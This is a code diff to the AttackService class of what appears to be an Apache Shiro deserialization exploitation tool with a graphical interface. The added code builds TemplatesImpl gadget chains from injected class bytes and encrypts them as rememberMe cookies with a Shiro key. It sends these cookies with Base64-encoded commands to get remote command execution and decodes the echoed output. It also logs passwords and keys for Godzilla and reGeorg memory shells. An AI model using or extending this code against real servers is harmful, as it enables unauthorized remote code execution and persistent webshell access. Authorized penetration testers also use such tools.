@@ -9,6 +9,10 @@ import com.summersec.attack.deser.payloads.ObjectPayload;
 import com.summersec.attack.deser.plugins.servlet.MemBytes;
 import com.summersec.attack.deser.plugins.keytest.KeyEcho;
 import com.summersec.attack.deser.util.Gadgets;
+import com.summersec.attack.deser.util.Gadgetsasm;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.summersec.attack.entity.ControllersFactory;
 import com.summersec.attack.UI.MainController;
 import com.summersec.attack.integration.generator.GeneratorFacade;
@@ -25,6 +29,7 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
+import java.lang.reflect.Field;
 import java.net.Proxy;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
@@ -35,6 +40,8 @@ import java.util.regex.Pattern;
 import javafx.application.Platform;
 import javafx.collections.ObservableList;
 import javafx.scene.control.TextArea;
+import javassist.ClassPool;
+import javassist.CtClass;
 import org.apache.commons.lang.StringUtils;
 import org.apache.shiro.codec.Base64;
 
@@ -310,7 +317,7 @@ public class AttackService {
                 if (this.method.equals("GET")) {
                     HttpResponse resp = this.executeHutoolGetFollowNoRedirect(combineHeaders);
                     result = flattenHutoolResponse(resp);
-                    if (!responseIndicatesGadgetHit(result) && !result.contains("$$$")) {
+                    if (!responseIndicatesGadgetHit(result) && !result.contains("$$$") && !result.contains("rememberMe")) {
                         result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
                     }
                 } else {
@@ -334,11 +341,14 @@ public class AttackService {
         if (trimmed.isEmpty()) {
             return "收到空响应";
         }
-        if (result.contains("=deleteMe")) {
-            return "检测到 rememberMe=deleteMe，目标可能拒绝或重置了 Cookie";
+        if (result.contains("$$$") || result.contains("Host:")) {
+            return "检测到回显标记（echo 已生效）";
         }
         if (result.contains("->|") && result.contains("|<-")) {
             return "检测到特征回显内容";
+        }
+        if (result.contains("=deleteMe")) {
+            return "检测到 rememberMe=deleteMe，目标可能拒绝或重置了 Cookie";
         }
         if (result.contains("HTTP/1.1 302") || result.contains("HTTP/1.1 301")
                 || result.contains("HTTP/1.1 303") || result.contains("HTTP/1.1 307")
@@ -397,8 +407,6 @@ public class AttackService {
 
         for(int i = 0; i < gadgetItems.size(); ++i) {
             for(int j = 0; j < echoesItems.size(); ++j) {
-                System.out.println();
-                System.out.println(echoesItems.get(j));
                 targets.add(gadgetItems.get(i) + ":" + echoesItems.get(j));
             }
         }
@@ -811,7 +819,7 @@ public class AttackService {
                 }
                 if (!changeKeyMode && !result.contains("->|change key ok|<-") && godzillaLike) {
                     logArea.appendText(Utils.log("[密码] " + shellPass));
-                    logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
+                    logArea.appendText(Utils.log("[密钥] key"));
                     logArea.appendText(Utils.log("[加密方式] AES"));
                 } else if (!changeKeyMode && !result.contains("->|change key ok|<-") && !reGeorgServlet && !reGeorgFilter) {
                     logArea.appendText(Utils.log("[密码] " + shellPass));
@@ -833,7 +841,7 @@ public class AttackService {
                     }
                     if (!changeKeyMode && godzillaLike) {
                         logArea.appendText(Utils.log("[密码] " + shellPass));
-                        logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
+                        logArea.appendText(Utils.log("[密钥] key"));
                         logArea.appendText(Utils.log("[加密方式] AES"));
                     } else if (!changeKeyMode && !reGeorgServlet && !reGeorgFilter) {
                         logArea.appendText(Utils.log("[密码] " + shellPass));
@@ -934,7 +942,8 @@ public class AttackService {
                 && ("rememberMe".equalsIgnoreCase(headerNameHint.trim())
                 || headerNameHint.toLowerCase(Locale.ROOT).contains("remember"));
         boolean hintCookie = headerNameHint == null || "Cookie".equalsIgnoreCase(headerNameHint.trim());
-        if (p.length() >= 32 && (hintRemember || hintCookie)) {
+        boolean looksLikeBase64 = p.length() >= 32 && p.matches("[A-Za-z0-9+/]+={0,2}");
+        if (p.length() >= 32 && (hintRemember || hintCookie || looksLikeBase64)) {
             return "rememberMe=" + p;
         }
         return null;
@@ -966,11 +975,60 @@ public class AttackService {
         try {
             String result = this.bodyHttpRequest(header, "");
             appendResponseSummary(logArea, "[Cookie] 已发送 rememberMe 载荷，", result);
-            if (result != null) {
-                if (result.length() <= 2000) {
-                    logArea.appendText(Utils.log(result));
-                } else {
-                    logArea.appendText(Utils.log(result.substring(0, 500) + "..."));
+            logArea.appendText(Utils.log("-------------------------------------------------"));
+            return result;
+        } catch (Exception e) {
+            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
+            return null;
+        }
+    }
+
+    /**
+     * 发送 rememberMe Cookie + 命令，一步完成 echo 激活 + 命令执行。
+     * 响应包含 {@code $$$<base64(result)>$$$} 时自动解码返回命令结果。
+     */
+    public String sendRememberMeCookieExploitWithCmd(String cookieLine, String command, TextArea sink) {
+        return sendRememberMeCookieExploitWithCmd(cookieLine, command, false, sink);
+    }
+
+    public String sendRememberMeCookieExploitWithCmd(String cookieLine, String command, boolean plainCmd, TextArea sink) {
+        if (cookieLine == null || cookieLine.trim().isEmpty()) {
+            return null;
+        }
+        if (command == null || command.trim().isEmpty()) {
+            return sendRememberMeCookieExploit(cookieLine, sink);
+        }
+        String c = cookieLine.trim();
+        String authValue = plainCmd ? command.trim() : "Basic " + Base64.encodeToString(command.trim().getBytes(StandardCharsets.UTF_8));
+        HashMap<String, String> header = new HashMap<String, String>();
+        header.put("Cookie", c);
+        header.put("Authorization", authValue);
+        TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
+        try {
+            String result = this.bodyHttpRequest(header, "");
+            appendResponseSummary(logArea, "[Cookie+CMD] 已发送 rememberMe 载荷，", result);
+            if (result != null && result.contains("$$$")) {
+                String[] parts = result.split("\\$\\$\\$");
+                if (parts.length >= 2) {
+                    String b64 = parts[1];
+                    if (b64 != null && !b64.isEmpty()) {
+                        byte[] b64bytes = Base64.decode(b64);
+                        String decoded = new String(b64bytes, Utils.guessEncoding(b64bytes));
+                        logArea.appendText(Utils.log("[命令结果] " + command + "\n" + decoded));
+                        logArea.appendText(Utils.log("-------------------------------------------------"));
+                        return decoded;
+                    }
+                }
+                logArea.appendText(Utils.log("[命令结果] " + command + " (返回为空)"));
+            } else if (result != null) {
+                int idx = result.indexOf("\n\n");
+                if (idx >= 0) {
+                    String body = result.substring(idx + 2).trim();
+                    if (!body.isEmpty()) {
+                        logArea.appendText(Utils.log("[命令结果] " + command + "\n" + body));
+                        logArea.appendText(Utils.log("-------------------------------------------------"));
+                        return body;
+                    }
                 }
             }
             logArea.appendText(Utils.log("-------------------------------------------------"));
@@ -1002,12 +1060,42 @@ public class AttackService {
             request.setFormatType(formatType);
             request.setJegCmdText(jegCmdText);
             request.setJegCodeText(jegCodeText);
+            request.setShiroKey(shiroKey != null ? shiroKey.trim() : null);
             EchoGenerateResult result = generatorFacade.generateEcho(source, request)
                     .withSelection(serverType, modelType, formatType);
             if (!result.isSuccess()) {
                 String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                 if (rememberMe != null && !rememberMe.isEmpty()) {
                     this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Echo 生成失败，已自动回退 Legacy"));
+                    return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
+                }
+            }
+            if (result.isSuccess() && "jEG".equalsIgnoreCase(source)) {
+                String raw = result.getPayload();
+                String diag = "[jEG] raw length=" + (raw != null ? raw.length() : 0) + ", head=" + (raw != null && raw.length() > 10 ? raw.substring(0, Math.min(20, raw.length())) : "null");
+                this.mainController.logTextArea.appendText(Utils.log(diag));
+                this.mainController.InjOutputArea.appendText(Utils.log(diag));
+                if (raw != null && raw.length() > 80 && raw.startsWith("yv66vg")) {
+                    try {
+                        byte[] classBytes = Base64.decode(raw.trim());
+                        Object template = Gadgets.createTemplatesImpl(classBytes);
+                        System.out.println("[jEG] template created, class=" + template.getClass().getName());
+                        Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(legacyGadget);
+                        this.mainController.logTextArea.appendText(Utils.log("[jEG] gadgetClazz=" + (gadgetClazz != null ? gadgetClazz.getName() : "null")));
+                        if (gadgetClazz != null) {
+                            ObjectPayload<?> gp = gadgetClazz.newInstance();
+                            Object chainObject = gp.getObject(template);
+                            String rememberMe = shiro.sendpayload(chainObject, "rememberMe", shiroKey);
+                            this.mainController.logTextArea.appendText(Utils.log("[jEG] 已封装，rememberMe length=" + (rememberMe != null ? rememberMe.length() : 0)));
+                            return EchoGenerateResult.ok("jEG", rememberMe, "Cookie");
+                        }
+                    } catch (Exception e) {
+                        this.mainController.logTextArea.appendText(Utils.log("[jEG] 封装失败: " + e.getMessage()));
+                    }
+                }
+                String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
+                if (rememberMe != null && !rememberMe.isEmpty()) {
+                    this.mainController.logTextArea.appendText(Utils.log("[jEG] 封装失败，已自动回退 Legacy"));
                     return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
                 }
             }
